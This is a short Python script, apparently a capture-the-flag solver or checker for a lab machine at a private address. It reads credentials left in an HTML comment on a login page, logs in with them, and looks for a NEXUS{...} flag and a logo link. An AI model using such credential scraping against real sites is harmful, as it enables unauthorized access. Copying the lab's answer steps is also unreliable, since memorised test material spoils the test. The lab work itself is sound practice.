import re
import requests

URL = "http://192.168.56.21/login.php"  

# 1. Load the login page and look for credentials in the HTML comment
page = requests.get(URL).text
match = re.search(r"<!--.*?creds are (\S+) / (\S+?)\s*-->", page)
if not match:
    raise SystemExit("FAIL: no credentials found in page source")
user, password = match.groups()
print("Found in HTML comment:", user, "/", password)

# 2. Log in with those credentials
resp = requests.post(URL, data={"user": user, "pass": password}).text

# 3. Check for the flag and the logo download link
flag = re.search(r"NEXUS\{[^}]+\}", resp)
print("Flag found:", flag.group() if flag else "FAIL: no flag in response")
print("Logo link present:", "logo.jpeg" in resp)
